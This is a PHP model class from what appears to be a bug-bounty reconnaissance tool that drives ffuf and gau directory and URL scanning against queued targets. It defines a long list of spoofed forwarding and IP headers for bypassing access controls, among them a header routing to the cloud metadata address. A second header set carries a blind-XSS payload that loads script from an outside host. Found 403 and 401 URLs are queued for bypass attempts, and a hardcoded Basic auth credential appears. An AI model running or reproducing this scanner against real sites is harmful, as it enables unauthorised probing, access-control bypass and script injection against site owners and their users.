<?php

namespace frontend\models;

use Yii;
use yii\db\ActiveRecord;
use frontend\models\Nuclei;
use frontend\models\Queue;

ini_set('max_execution_time', 0);

class Dirscan extends ActiveRecord
{
    public static function dirscan($input)
    {
        global $headers; global $usewordlist; global $randomid; global $executeshell; global $counter; global $blacklist; $counter = 0;

        if( !empty($input["url"]) ) $urls = json_decode($input["url"], true); else return 0; //no need to scan without supplied url explode(PHP_EOL, $input["url"]);

        $randomid = rand(60000,1000000000);

        foreach ($urls as $url){

            //inside foreach because there are issues with preg_match and adding new headers + using local ones
            $headers = " -H 'Accept-Language: en-US;q=0.8,en;q=0.5' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Client-IP: 127.0.0.1' -H 'Forwarded-For-Ip: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-For-Original: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-By: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' -H 'X-Host: 127.0.0.1' -H 'X-Forwared-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'X-Cluster-Client-IP: 127.0.0.1' -H 'Fastly-Client-IP: 127.0.0.1' -H 'X-debug: 1' -H 'debug: 1' -H 'CACHE_INFO: 127.0.0.1' -H 'CLIENT_IP: 127.0.0.1' -H 'COMING_FROM: 127.0.0.1' -H 'CONNECT_VIA_IP: 127.0.0.1' -H 'FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-CLIENT-IP: 127.0.0.1' -H 'HTTP-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-PC-REMOTE-ADDR: 127.0.0.1' -H 'HTTP-PROXY-CONNECTION: 127.0.0.1' -H 'HTTP-VIA: 127.0.0.1' -H 'HTTP-X-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-X-IMFORWARDS: 127.0.0.1' -H 'HTTP-XROXY-CONNECTION: 127.0.0.1' -H 'PC_REMOTE_ADDR: 127.0.0.1' -H 'PRAGMA: 127.0.0.1' -H 'PROXY: 127.0.0.1' -H 'PROXY_AUTHORIZATION: 127.0.0.1' -H 'PROXY_CONNECTION: 127.0.0.1' -H 'REMOTE_ADDR: 127.0.0.1' -H 'VIA: 127.0.0.1' -H 'X_COMING_FROM: 127.0.0.1' -H 'X_DELEGATE_REMOTE_HOST: 127.0.0.1' -H 'X_FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_FORWARDED_FOR_IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_IMFORWARDS: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_LOOKING: 127.0.0.1' -H 'XONNECTION: 127.0.0.1' -H 'XPROXY: 127.0.0.1' -H 'l5d-dtab: /$/inet/169.254.169.254/80' -H 'XROXY_CONNECTION: 127.0.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'HTTP_X_REAL_IP: 127.0.0.1' -H 'X-Source: 127.0.0.1' -H 'HTTP_X_FORWARDED_FOR: 127.0.0.1' -H 'X-Forwarded-User: admin' -H 'x-balancer-ip: 127.0.0.1' -H 'x-forwarded-for-y: 127.0.0.1' -H 'x-yandex-internal-request: 1' -H 'X-Bug-Bounty: 5d192f443f79484ce37f8a2f850308fe661f9ea17a56bd44cc9ce2e3b6002d8e' -H 'x-q-domid: 15877' "; //-H 'Connection: close' -H 'X-BugBounty-Hackerone: wellenc_lex' -H 'X-Bug-Bounty: wellenc_lex'

            $xssheaders = " -H 'Accept-Language: en-US;q=0.8,en;q=0.5' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Originating-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-For: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Remote-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Remote-Addr: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Real-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-Host: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Forwarded-For-Ip: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Forwarded-For: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Forwarded: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-For-Original: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-By: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Custom-IP-Authorization: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Host: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwared-Host: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'True-Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Cluster-Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'Fastly-Client-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-debug: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'debug: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'CACHE_INFO: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'CLIENT_IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'COMING_FROM: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'CONNECT_VIA_IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'FORWARDED: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-CLIENT-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-FORWARDED-FOR-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-PC-REMOTE-ADDR: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-PROXY-CONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-VIA: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-X-FORWARDED-FOR-IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-X-IMFORWARDS: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP-XROXY-CONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PC_REMOTE_ADDR: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PRAGMA: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PROXY: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PROXY_AUTHORIZATION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'PROXY_CONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'REMOTE_ADDR: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'VIA: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_COMING_FROM: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_DELEGATE_REMOTE_HOST: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_FORWARDED: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_FORWARDED_FOR_IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_IMFORWARDS: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X_LOOKING: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'XONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'XPROXY: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'XROXY_CONNECTION: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Custom-IP-Authorization: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP_X_REAL_IP: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Source: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'HTTP_X_FORWARDED_FOR: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'X-Forwarded-User: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'x-balancer-ip: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'x-forwarded-for-y: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' -H 'x-yandex-internal-request: *//**/\'>\">--></style></title></textarea><script/src=//z00.vercel.app></script>' ";

            $counter++;

            $currenturl = $url["url"];

            $ip = $url["ip"];

            $queueid = (int) $url["queueid"];

            $taskid = (int) $url["taskid"];

            $usewordlist = (int) $url["wordlist"];

            if (preg_match("/skill|skgb/i", $currenturl) === 1) {
                $headers = $headers." -H 'Authorization: Basic dGVzdDpza2lsbGJveHRlc3Rpbmc=' ";
            }

            if (preg_match("/.*filed.*.my.mail.ru/i", $currenturl) === 1) {
                dirscan::queuedone($queueid);
                continue; //scanning cdn is pointless
            }

            if (preg_match("/.*cs.*.vk.me/i", $currenturl) === 1) {
                dirscan::queuedone($queueid);
                continue; //scanning cdn is pointless
            }

            if (preg_match("/.*wg\d*.ok.ru/i", $currenturl) === 1) {
                dirscan::queuedone($queueid);
                continue; //scanning cdn is pointless
            }

            if (preg_match("/.*storage.yandex.net/i", $currenturl) === 1) {
                dirscan::queuedone($queueid);
                continue; //scanning cdn is pointless
            }

            $currenturl = preg_replace("/[\n\r]/", "", $currenturl);

            $hostname = dirscan::ParseHostname($currenturl);

            $port = dirscan::ParsePort($currenturl);

            if (strpos($currenturl, 'https://') !== false) {
                $scheme = "https://";
            } else $scheme = "http://";

            $hostname = rtrim($hostname, '/');

            $scanurl = $scheme.$hostname.$port;

            if( ($scheme==="http://" && $port===":443") || ($scheme==="https://" && $port===":80")){
                dirscan::queuedone($queueid);
                continue; //scanning https port with http scheme is pointless
            }

            if( $scheme==="http://" && ($port===":8443" || $port===":4443") ){
                $scheme="https://"; //httpx found wrong scheme. cant be both http and SSL
            }

            //if ( $port===":8443" || $port===":8880" || $port===":8800" ) continue; //scanning port isnt working in this ffuf version?

            if( dirscan::bannedsubdomains($scanurl) !== 0 ){
                //dirscan::addtonuclei($scanurl);
                dirscan::queuedone($queueid);

                Yii::$app->db->close();
                continue; //scanning banned subdomains is pointless
            }

            $domainfull = substr($hostname, 0, strrpos($hostname, ".")); //hostname without www. and .com at the end

            $hostonly = preg_replace("/(\w\d\-\_)*\./", "", $domainfull); //hostname without subdomain and .com at the end

            $firstpartofsubdomain = preg_match('/^[\w\d\-\_]+/', $hostname, $matches); 

            $firstpartofsubdomain = $matches[0];

            if ($domainfull == $hostonly) $hostonly = ""; //remove duplicate extension from scan

            if ( ($firstpartofsubdomain == $hostonly) || ($firstpartofsubdomain == $domainfull) || ($firstpartofsubdomain == $hostname) ) $firstpartofsubdomain = ""; //remove duplicate extension from scan

            $extensions = "_,0,~,~1,1,2,inc,ini,log,php,asp,aspx,jsp,py,txt,tmp,conf,config,bak,backup,old,db,sql,com,com.zip,bz2,zip,tar,rar,tgz,js,json,tar.gz,php~";

            if ( $hostname != "" ) $extensions = $extensions . "," . $hostname; if ( $domainfull != "" )           $extensions = $extensions . "," . $domainfull;
            if ( $hostonly != "" ) $extensions = $extensions . "," . $hostonly; if ( $firstpartofsubdomain != "" ) $extensions = $extensions . "," . $firstpartofsubdomain;

            if (preg_match('/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/', $hostname, $matches) == 1) {
                $ip = $matches[0]; //set IP if wasnt specified by user but is in the url
            } else $ip = 0;

            $output_ffuf = array();

            $outputdir = "/ffuf/" . $randomid . "/" . $counter . "/";
            
            $ffuf_output = $outputdir ."out.json";
            $ffuf_output_localhost = $ffuf_output . ".localhost.json";
            $ffuf_output_wordlist = $ffuf_output . ".wordlist";
            $ffuf_output_custom = $ffuf_output . ".custom";

            exec("sudo mkdir /ffuf/" . $randomid . "/"); //create dir for ffuf scan results
            exec("sudo mkdir " . $outputdir . " "); //create dir for ffuf scan results
            exec("sudo chmod -R 777 /ffuf/" . $randomid . "/");
            
            $ffuf_string = "sleep 3 && /go/ffuf/ffuf -maxtime 2999000 -mc all -fc 504,501,404,403,429,503,502,406,520,522 -fs 612,613,548,26,25,0,696956 -s -timeout 150 -t 1 -rate 1 -p 1 -fr 'Selligent Marketing Cloud|Incapusla Incident|shopify|okta|medium.com|Vercel|Too Many Requests|blocked by|Blocked by|Please wait while|Thank you for using nginx|Welcome to nginx|Scan your infrastructure with us|Ubuntu Default Page|It works!|Welcome to CentOS|cloudflareaccess.com|rs_weight=1|This page is used to test the proper operation of the|This directory contains your static files|The requested URL was rejected|HTTP Error: 414|Cloudflare is currently unable to resolve your|400 Bad Request' -r -ac -noninteractive ";
            
            
            $general_ffuf_string = $ffuf_string.$headers." -w /configs/dict.txt:FUZZ -D -e " . escapeshellarg($extensions) . " -od " . $outputdir . " -of json ";

            $currenturl = rtrim($currenturl, ' '); $currenturl = trim($currenturl);
            
            if ( $ip == 0) { //IF no specific IP set for URL
                $start_dirscan = $general_ffuf_string . " -u " . escapeshellarg($currenturl."/FUZZ") . " -o " . $ffuf_output . " ";

                $start_dirscan_xss = $ffuf_string.$xssheaders . " -u " . escapeshellarg($currenturl."/") . "  ";

                $start_dirscan_xss_headers = $ffuf_string.$headers . " -u " . escapeshellarg($currenturl."/") . "  ";

                $start_dirscan_xss1 = $ffuf_string.$xssheaders . " -u " . escapeshellarg($currenturl."/admin") . "  ";

                $start_dirscan_xss_headers1 = $ffuf_string.$headers . " -u " . escapeshellarg($currenturl."/admin") . "  ";

                //XSS headers x-forwarded, etc
            } else {
                $ip = dirscan::ParseIP($ip);

                $start_dirscan = $general_ffuf_string ." -u " . escapeshellarg($scheme.$ip.$port."/FUZZ") . " -H " . escapeshellarg('Host: ' . $hostname) . " -p 0.5 -H 'CF-Connecting-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -o " . $ffuf_output . " ";

                $start_dirscan_localhost = $general_ffuf_string . " -u " . escapeshellarg($scheme.$ip.$port."/FUZZ") . " -p 0.1  -H 'Host: localhost' -H 'CF-Connecting-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -o " . $ffuf_output_localhost . " -ac=0 ";

                $executeshell = $executeshell . $start_dirscan_localhost . " & ".PHP_EOL;
            }

            $executeshell = $executeshell . $start_dirscan . " & ".PHP_EOL;
            /*$executeshell = $executeshell . $start_dirscan_xss1 . " & ".PHP_EOL;
            $executeshell = $executeshell . $start_dirscan_xss_headers1 . " & ".PHP_EOL;
            $executeshell = $executeshell . $start_dirscan_xss_headers . " & ".PHP_EOL;
            $executeshell = $executeshell . $start_dirscan_xss . " & ".PHP_EOL;*/
            

            if($usewordlist=="1" && $taskid != 0){

                //ffuf /site.com/subdomain.site.com/ from amass/gau wordlist
                $task = Tasks::find()
                        ->where(['taskid' => $taskid])
                        ->limit(1)
                        ->one();

                Yii::$app->db->close();  
                if($task){
                    $vhostwordlist = json_decode($task->vhostwordlist, true);

                    if (!empty($vhostwordlist)) {
                        $hostsfile =  $outputdir . "domains.txt";
                        file_put_contents($hostsfile, implode( PHP_EOL, $vhostwordlist) ); //to use domains supplied by user as FFUF wordlist

                        $start_dirscan = $ffuf_string . " -mc all -ac " . $headers . " -u " . escapeshellarg($scheme.$hostname.$port."/HOSTS/") . " -w " . $hostsfile . ":HOSTS -o " . $ffuf_output_wordlist . " ";

                        $executeshell = $executeshell . $start_dirscan . " & ".PHP_EOL;
                    }
                }
            }

            //Create subdomain/domain - based wordlists
            $file = $outputdir . "custom.txt";

            if ( dirscan::makecustomwordlist($hostname, $domainfull, $hostonly, $firstpartofsubdomain, $file) == 1 ) {
                
                $start_dirscan = $ffuf_string.$headers." -mc all -w " . $file . ":FUZZ -D -e " . escapeshellarg($extensions) . " -od " . $outputdir . " -of json " . " -u " . escapeshellarg($currenturl."/FUZZ") . " -o " . $ffuf_output_custom;

                $executeshell = $executeshell . $start_dirscan . " & ".PHP_EOL;
            }

            if ( $ip == 0 ) {
                if ( $port == "" ) {

                    $blacklist = "'js,eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt,ico,icons,images,img,images,fonts,font-icons,mp4,mp3'";

                    $gau = "sleep 180 && timeout 2000 /go/bin/gau --blacklist ". $blacklist ." --threads 1 --retries 15 --timeout 300 --fc 504,404,302,301 --o ". $outputdir . "gau.txt " . escapeshellarg($hostname) . " ";

                    $executeshell = $executeshell . $gau . " & ".PHP_EOL;
                }
            }
        }


        //write bash command for parallel execution to the file and execute the file.
        $shellfile = "/ffuf/" . $randomid . "/shell.sh";
        $runffufs = ("#!/bin/bash
            mkdir /ffuf/" . $randomid . "/
            echo \"executed \";
            " . $executeshell . "
            wait; >> /ffuf/" . $randomid . "/0bash.txt && cat /ffuf/" . $randomid . "/*/gau.txt >> /ffuf/gau.txt");

        file_put_contents($shellfile, $runffufs);
//--net=container:vpn". rand(1,3) ."
        exec("sudo chmod +x " . $shellfile . " && sudo docker run    -v ffuf:/ffuf -v configs:/configs --cpu-shares 128 --rm 5631/ffufs " . $shellfile);

        while($counter!=0){

            $output_ffuf = array();

            $outputdir = "/ffuf/" . $randomid . "/" . $counter . "/";
            $ffuf_output = $outputdir ."out.json";
            $ffuf_output_localhost = $ffuf_output . ".localhost.json";
            $ffuf_output_wordlist = $ffuf_output . ".wordlist";
            $ffuf_output_custom = $ffuf_output . ".custom";
            
            $output_ffuf[] = dirscan::ReadFFUFResult($ffuf_output, 0, $outputdir);
            $output_ffuf[] = dirscan::ReadFFUFResult($ffuf_output_localhost, 1, $outputdir);
            $output_ffuf[] = dirscan::ReadFFUFResult($ffuf_output_wordlist, 0, $outputdir);
            $output_ffuf[] = dirscan::ReadFFUFResult($ffuf_output_custom, 0, $outputdir);

            $gau_result = dirscan::gau($outputdir . "gau.txt");

            $output_ffuf =  array_filter( array_unique( $output_ffuf ) );

            if ( count( $output_ffuf ) > 0 ) dirscan::savetodb($urls[$counter]["taskid"], $output_ffuf, $gau_result, $urls[$counter]["url"]);

            dirscan::queuedone($urls[$counter]["queueid"]);

            $counter--;
        }

        exec("sudo rm -rf /ffuf/" . $randomid . "/"); //ffuf creates huge amount of files and eats space. ~2TB in 30k ffuf dirs.

        Yii::$app->db->close();

        return 1;
    }

    public static function tableName()
    {
        return 'tasks';
    }

    public static function bannedsubdomains($in)
    {
        if (preg_match("/dev|stage|test|proxy|stg|int|adm|uat/i", $in) === 1) {
            return 0; //if its used for internal or develop purposes - we need to scan it anyway
        } else { 
            return preg_match("/link|support|^ws|wiki|enterpriseenrollment|status|docs|help|jira|lync|maintenance|atlassian|autodiscover|grafana|confluence|spider-(\d)*.yandex.*|gitlab|zendesk|sentry|(url(\d)*)|.*\.gb\.ru|.*timeweb.*|da\d*.timeweb.*|bitrix\d*.timeweb.*/i", $in);
            //returns 1 if string has something from the regexp 
        }
    }

    public static function queuedone($queueid)
    {
        $queue = Queue::find()
            ->where(['id' => $queueid])
            ->limit(1)
            ->one();

        if($queue!=""){
            $queue->todelete = 1;
            $queue->date_modified = date("Y-m-d");
            $queue->save();
        }

        return 1;
    }

    public static function savetodb($taskid, $output_ffuf, $gau_result, $hostname)
    {
        global $randomid;

        $ffuf = $output_ffuf;

        $output_ffuf = json_encode($output_ffuf);

        $output_ffuf = preg_replace("/(null,{)|(null,.?\[)/", "", $output_ffuf);

        if( !empty($output_ffuf ) ){

            do{
                try{
                    $tryAgain = false;
                    Yii::$app->db->open();
                    global $usewordlist;

                    if($usewordlist==0){

                        $dirscan = Tasks::find()
                            ->where(['taskid' => $taskid])
                            ->limit(1)
                            ->one();

                        if(!empty($dirscan) && ($dirscan->dirscan == "")) { //if task exists in db

                            $dirscan->dirscan_status = "Done.";
                            $dirscan->dirscan = $output_ffuf;
                            $dirscan->notify_instrument = $dirscan->notify_instrument."3";
                            $dirscan->wayback = $gau_result;
                            $dirscan->date = date("Y-m-d H-i-s");

                            $dirscan->save();

                        } else {
                            $dirscan = new Tasks();
                            $dirscan->host = $hostname;
                            $dirscan->dirscan_status = "Done.";
                            $dirscan->dirscan = $output_ffuf;
                            $dirscan->notify_instrument = $dirscan->notify_instrument."3";
                            $dirscan->wayback = $gau_result;
                            $dirscan->date = date("Y-m-d H-i-s");

                            $dirscan->save();
                        }
                    } else {

                        $dirscan = new Tasks();
                        $dirscan->host = $hostname;
                        $dirscan->dirscan_status = "Done.";
                        $dirscan->dirscan = $output_ffuf;
                        $dirscan->notify_instrument = $dirscan->notify_instrument."3";
                        $dirscan->wayback = $gau_result;
                        $dirscan->date = date("Y-m-d H-i-s");

                        $dirscan->save();
                    }

                    $forbidden = array(); $basicauth = array();

                    foreach ($ffuf as $oneffuf) {

                        if ( $oneffuf["status"] == "403") {
                            $forbidden[] = $oneffuf["url"];
                        }

                        if ( $oneffuf["status"] == "401") {
                            $basicauth[] = $oneffuf["url"];
                        }
                    }

                    if ( count($forbidden) < 15 && count($forbidden) >= 1) {
                        
                        foreach($forbidden as $forbiddenurl){

                            //add 403 urls to queue
                            $queue = new Queue();
                            $queue->dirscanUrl = $forbiddenurl;
                            $queue->instrument = 10; //403 bypass
                            $queue->save();
                        }
                    }

                    if ( count($basicauth) >= 1) {
                        
                        foreach($basicauth as $basicauthurl){

                            //add 401 urls to queue
                            $queue = new Queue();
                            $queue->dirscanUrl = $basicauthurl;
                            $queue->instrument = 12; //401 bypass
                            $queue->save();
                        }
                    }
                   
                } catch (\yii\db\Exception $exception) {

                    $tryAgain = true;
                    sleep(6000);

                    dirscan::savetodb($taskid, $output_ffuf, $gau_result, $hostname);
                    Yii::$app->db->close();
                    
                    file_put_contents("/dockerresults/".$randomid."error", $output_ffuf);
                }
            } while($tryAgain);
        }
  
    }

    public static function ParseScheme($url)
    {
        $url = strtolower($url);

        preg_match_all("/(https?:\/\/)?([\w\-\_\d\.][^\/\:\&\[\r\n\?]+)/i", $url, $domain); //get hostname only
        
        return trim( $domain[1][0], ' '); //group 1 == scheme
    }

    public static function ParseHostname($url)
    {
        $url = strtolower($url);

        preg_match_all("/(https?:\/\/)?([\w\-\_\d\.][^\/\:\&\[\r\n\?]+)/i", $url, $domain); //get hostname only
        
        return trim( $domain[2][0], ' '); //group 2 == domain name

    }

    public static function ParseIP($ip)
    {
        $ip = strtolower($ip);

        preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/", $ip, $ip); //get ip only //weird regex because IP parses throguht regexp earlier - when form submits
      
        return trim( $ip[0], ' '); //everything thats inside regex
    }

    public static function ParsePort($url)
    {
        $url = strtolower($url);

        preg_match_all("/\:[\d[\r\n\?]+/i", $url, $port); //get hostname only

        if(isset($port[0][0]) && $port[0][0]!="") {
            $port = $port[0][0]; 
        } else $port = "";
        
        return trim( $port, ' '); // :8443
    }

    public static function ReadFFUFResult($filename, $localhost, $outputdir)
    {
        $status403 = 0; $otherstatus = 0; //we dont need results with only 403 outputs because they are useless.

        if (file_exists($filename)) {
            $output = json_decode(file_get_contents($filename), true);

            $output_ffuf = array();
            $id=0;
            $result_length = array();

            if( isset($output["results"]) ) {
                foreach ($output["results"] as $results) {
                    if ( $results["length"] >= 0 && !in_array($results["length"], $result_length) ){
                        $id++;

                        if ( $results["status"] == 403 || $results["status"] == 522 ) $status403 = 1; else $otherstatus = 1;

                        $result_length[] = $results["length"];//so no duplicates gonna be added
                        $output_ffuf[$id]["url"] = $results["url"];
                        $output_ffuf[$id]["length"] = $results["length"];
                        $output_ffuf[$id]["status"] = $results["status"];
                        $output_ffuf[$id]["redirect"] = $results["redirectlocation"];
                        if($localhost==1) $output_ffuf[$id]["localhost"] = 1;

                        if ($results["length"] < 45000000 ){

                            $resultfilename = $outputdir . $results["resultfile"];

                            if (file_exists($resultfilename)) {
                                $output_ffuf[$id]["resultfile"] = base64_encode(file_get_contents($resultfilename));
                            }
                        }
                    }
                }
            } 
        }

        if ( $status403 == 1 && $otherstatus == 0 ) $output_ffuf = array();

        return $output_ffuf;
    }

    public static function Gau($name)
    {
        if( file_exists($name) ){
            $gau_result = explode("\n", file_get_contents($name) );

            if ( count($gau_result)>=1 ) $gau_result = array_unique( $gau_result ); else return array();

            foreach ($gau_result as $id => $result) {
                //wayback saves too much junk info (js,images,xss payloads)
                if(preg_match("/(%22|\"|\">|<|<\/|\<\/|%20| |%0d%0a|\<\!\-\-|\<\!\-\-\/\/)/i", $result) === 1 ){
                    unset($gau_result[$id]);
                }
            }

            $gau_result = array_map('htmlentities', $gau_result);
            $gau_result = json_encode($gau_result, JSON_UNESCAPED_UNICODE);

            return $gau_result;
        } else return array();
    }

    //www.test.google-stage.com -> www.test.google-stage -> www.test -> www 
    public static function sliceHost($host){
        global $vhostlist;
        STATIC $stop = 1;
        while ($stop != 0){
            $outputValue = preg_replace('/\.(\w[\-\_\d]?)*$/', '', $host, 1, $stop);
            
            array_push($vhostlist, $outputValue);
            dirscan::sliceHost($outputValue);
        }
    }

    public static function dosplit($input){
        //www.test.google.com -> www test google
        global $vhostlist;
        preg_match_all("/(\w[\-\_\d]?)*\./", $input, $out);

        if($out[0][0]!=""){
            $word = implode("", $out[0]);
            $word = rtrim($word, ".");
            $vhostlist[] = $word;
            dirscan::dosplit($word);
        }
    }

    public static function split2($input){
        //www.test.google.com -> www.test -> www
        global $vhostlist;

        preg_match_all("/(\w[\_\d]?)*\./", $input, $matches);

        foreach($matches[0] as $match){
            $vhostlist[] = rtrim($match, "."); 
        }
    }

    public static function makecustomwordlist($hostname, $domainfull, $hostonly, $firstpartofsubdomain, $file)
    {
        global $vhostlist;

        $vhostlist[] = $domainfull;
        $vhostlist[] = $hostonly;
        $vhostlist[] = $firstpartofsubdomain;

        dirscan::sliceHost($hostname);

        if (strpos($hostname, 'https://xn--') === false) {
            dirscan::dosplit($hostname);
            dirscan::split2($hostname);
        }
        $vhostlist = array_unique($vhostlist);

        foreach ($vhostlist as $domain) {
            $done[] = $domain . ".%EXT%"; //add dirsearch - compatiable extensions for ffuf
        }
        
        if ( !empty($done) ) {
            
            file_put_contents($file, implode( PHP_EOL, $done) );

            return 1;
        } else return 0;
    }
}


































